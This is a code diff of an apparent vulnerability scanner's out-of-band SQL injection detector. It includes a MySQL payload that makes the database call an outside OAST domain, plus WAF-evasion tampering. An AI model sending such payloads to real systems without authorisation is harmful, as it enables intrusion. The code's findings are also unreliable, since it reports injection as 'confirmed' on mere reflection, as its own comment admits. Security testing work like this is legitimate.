@@ -6,23 +6,26 @@ Out-of-Band (OOB) 檢測引擎 - 基於外帶通道的SQL注入檢測
 
 import re
 import uuid
-
-import httpx
+import aiohttp
+from typing import Dict, List, Tuple
 
 from aiva_common.schemas import FunctionTaskPayload
 from aiva_common.utils import get_logger
 
+from ..config import SqliConfig
 from ..detection_models import DetectionResult
 from ..payload_wrapper_encoder import PayloadWrapperEncoder
+from .base_detector import BaseDetector
 
 logger = get_logger(__name__)
 
 
-class OOBDetectionEngine:
+class OOBDetectionEngine(BaseDetector):
     """OOB檢測引擎 - 檢測基於外帶通道的SQL注入"""
 
-    def __init__(self, oast_domain: str = "interact.sh"):
-        self.oast_domain = oast_domain
+    def __init__(self, session: aiohttp.ClientSession, config: SqliConfig, payload_encoder: PayloadWrapperEncoder):
+        super().__init__(session, config, payload_encoder)
+        self.oast_domain = config.oast_domain
         self.oob_payloads = {
             "mysql": [
                 "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{subdomain}.{domain}', '\\\\share')) --",
@@ -45,44 +48,58 @@ class OOBDetectionEngine:
         }
 
     async def detect(
-        self, task: FunctionTaskPayload, client: httpx.AsyncClient
+        self, target_url: str, params: Dict[str, str], method: str = "GET"
     ) -> list[DetectionResult]:
         """執行OOB檢測"""
         results = []
-        encoder = PayloadWrapperEncoder(task)
 
-        logger.debug(f"Starting OOB detection for task {task.task_id}")
+        logger.debug(f"Starting OOB detection for {target_url}")
 
         # 為每個數據庫類型測試OOB載荷
         for db_type, payloads in self.oob_payloads.items():
             for payload_template in payloads:
                 try:
                     # 生成唯一子域名用於OOB檢測
-                    subdomain = f"sqli-{uuid.uuid4().hex[:8]}-{task.task_id[:8]}"
-                    payload = payload_template.format(
+                    subdomain = f"sqli-{uuid.uuid4().hex[:8]}-{self.payload_encoder.task.task_id[:8]}"
+                    raw_payload = payload_template.format(
                         subdomain=subdomain, domain=self.oast_domain
                     )
 
+                    # 應用 Tamper
+                    tampered_payloads = self.payload_encoder.apply_tamper(raw_payload, self.config.waf_evasion_level)
+                    final_payload = tampered_payloads[-1] if tampered_payloads else raw_payload
+
                     # 發送OOB載荷
-                    encoded = encoder.encode(payload)
-                    response = await client.request(
-                        method=encoded.method, url=encoded.url, **encoded.request_kwargs
-                    )
+                    encoded = self.payload_encoder.encode(final_payload)
+
+                    if encoded.method == "GET":
+                         async with self.session.get(encoded.url, **encoded.request_kwargs) as resp:
+                             text = await resp.text()
+                             conn_status = resp.status
+                             response_url = str(resp.url)
+                    else:
+                         async with self.session.post(encoded.url, **encoded.request_kwargs) as resp:
+                             text = await resp.text()
+                             conn_status = resp.status
+                             response_url = str(resp.url)
 
                     # 檢查回應中的OOB指示器
-                    oob_triggered = self._check_oob_response(response, subdomain)
+                    # 注意：真正的OOB檢測需要查詢OAST伺服器的API來確認
+                    # 這裡只檢查回應中是否反射了域名或有特定錯誤
+                    oob_triggered = self._check_oob_response(text, subdomain)
 
                     if oob_triggered:
                         result = self._build_detection_result(
-                            payload=payload,
+                            payload=final_payload,
                             subdomain=subdomain,
                             db_type=db_type,
-                            response=response,
-                            task=task,
+                            response_status=conn_status,
+                            response_url=response_url,
+                            method=method
                         )
                         results.append(result)
                         logger.info(
-                            f"OOB SQL injection detected: {db_type} with subdomain {subdomain}"
+                            f"OOB SQL injection detected (Reflected/Error): {db_type} with subdomain {subdomain}"
                         )
 
                 except Exception as e:
@@ -92,10 +109,8 @@ class OOBDetectionEngine:
         logger.debug(f"OOB detection completed. Found {len(results)} vulnerabilities")
         return results
 
-    def _check_oob_response(self, response: httpx.Response, subdomain: str) -> bool:
+    def _check_oob_response(self, response_text: str, subdomain: str) -> bool:
         """檢查回應中的OOB指示器"""
-        response_text = response.text or ""
-
         # 檢查回應中是否包含我們的子域名（可能表示DNS查詢）
         if subdomain in response_text:
             return True
@@ -135,8 +150,9 @@ class OOBDetectionEngine:
         payload: str,
         subdomain: str,
         db_type: str,
-        response: httpx.Response,
-        task: FunctionTaskPayload,
+        response_status: int,
+        response_url: str,
+        method: str
     ) -> DetectionResult:
         """構建檢測結果"""
         from aiva_common.enums import Confidence, Severity, VulnerabilityType
@@ -155,19 +171,25 @@ class OOBDetectionEngine:
         )
 
         evidence = FindingEvidence(
-            request=f"Payload: {payload}",
+            payload=payload,
+            request=f"Payload: {payload}, Method: {method}",
             response=(
-                f"Status: {response.status_code}, "
+                f"Status: {response_status}, "
                 f"OOB domain: {subdomain}.{self.oast_domain}"
             ),
             proof=(
                 f"The OOB payload targeting {db_type} triggered external "
-                f"network communication to {subdomain}.{self.oast_domain}, "
+                f"network communication or specific error to {subdomain}.{self.oast_domain}, "
                 f"confirming SQL injection vulnerability."
             ),
+            db_version=db_type
         )
 
         impact = FindingImpact(
+            description=(
+                "SQL injection can lead to unauthorized data access, "
+                "modification, or deletion."
+            ),
             business_impact=(
                 "Critical - potential for data exfiltration via external "
                 "channels, bypass firewalls, and potentially access "
@@ -186,9 +208,9 @@ class OOBDetectionEngine:
         )
 
         target = FindingTarget(
-            url=str(response.url),
-            method=task.target.method,
-            parameter=task.target.parameter,
+            url=response_url,
+            method=method,
+            parameter="unknown",
         )
 
         return DetectionResult(
